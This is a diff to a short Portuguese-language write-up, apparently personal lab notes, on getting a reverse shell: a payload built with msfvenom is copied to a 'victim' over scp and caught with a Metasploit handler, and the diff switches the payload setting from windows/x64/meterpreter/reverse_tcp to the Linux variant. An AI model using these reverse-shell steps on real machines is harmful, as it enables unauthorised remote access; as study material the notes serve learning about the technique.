@@ -3,7 +3,7 @@
 ### o que é?
 
 em vez de me conectar ao pc da vítima e ser bloqueado pelo firewall, eu fiz o pc da vítima se conectar ao meu, usando um shell.elf
-que fiz com msfvenom, enviei usando o protocolo scp e abri pelo meterpreter com meu msfconsole
+que fiz com msfvenom, enviei usando o protocolo scp (nesse cenário, eu já tinha acesso ssh) abri pelo meterpreter com meu msfconsole
 
 ## como isso tudo aconteceu?
 
@@ -13,7 +13,7 @@ que fiz com msfvenom, enviei usando o protocolo scp e abri pelo meterpreter com 
 
 // pra usar o handler (listener)
 
-🖥️ set PAYLOAD windows/x64/meterpreter/reverse_tcp
+🖥️ set PAYLOAD linux/x64/meterpreter/reverse_tcp
 
 // pra usar o payload de reverse connection
 
